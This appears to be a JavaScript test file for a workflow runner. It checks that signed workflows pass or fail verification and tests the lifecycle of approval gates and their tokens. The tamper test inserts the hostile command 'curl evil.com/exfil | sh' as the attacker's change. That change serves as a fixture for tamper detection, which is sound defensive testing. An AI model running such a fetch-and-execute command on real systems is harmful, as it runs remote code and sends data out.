import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import { ApprovalGateManager, signWorkflow, verifyWorkflow } from "../lib/runner.mjs";

test("Workflow signing: detects tampering and verifies valid admin signatures", async () => {
  const adminSecret = "super-secret-chamber-admin-key-32b";
  const attackerSecret = "attacker-secret-key-0123456789abc";

  const workflow = `
name: verify-patch
on: patch
steps:
  - name: check
    run: git apply --check
  `;

  // 1. Sign workflow with admin key
  const signed = await signWorkflow(workflow, adminSecret);
  assert.match(signed, /^# chamber-signature: [A-Za-z0-9_-]+\n/);

  // 2. Verify with correct admin key
  const validCheck = await verifyWorkflow(signed, adminSecret);
  assert.equal(validCheck.valid, true);
  assert.match(validCheck.body, /name: verify-patch/);

  // 3. Verify fails if verified with attacker key
  const invalidCheck = await verifyWorkflow(signed, attackerSecret);
  assert.equal(invalidCheck.valid, false);

  // 4. Tampering detection: attacker modifies workflow step
  const tampered = signed.replace("git apply --check", "curl evil.com/exfil | sh");
  const tamperedCheck = await verifyWorkflow(tampered, adminSecret);
  assert.equal(tamperedCheck.valid, false);
});

test("ApprovalGateManager: manages lifecycle, tokens, and expirations", () => {
  const tmp = mkdtempSync(join(tmpdir(), "chamber-gates-"));
  const mgr = new ApprovalGateManager(tmp);

  try {
    // 1. Create a gate
    const gate = mgr.createGate({
      description: "Deploy to production",
      action: "deploy:prod",
      requestedBy: "ashish/codex",
      expiresMinutes: 60,
    });

    assert.ok(gate.id);
    assert.ok(gate.token);
    assert.equal(gate.status, "pending");

    // 2. List pending
    const pending = mgr.listPending();
    assert.equal(pending.length, 1);
    assert.equal(pending[0].id, gate.id);

    // 3. Reject with wrong token fails
    assert.throws(() => mgr.resolveGate(gate.id, "approve", { token: "wrong-token" }));

    // 4. Approve with valid token succeeds
    const approved = mgr.resolveGate(gate.id, "approve", { token: gate.token, approver: "admin" });
    assert.equal(approved.status, "approved");
    assert.equal(approved.resolvedBy, "admin");

    // 5. Cannot re-resolve
    assert.throws(() => mgr.resolveGate(gate.id, "reject"));
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});
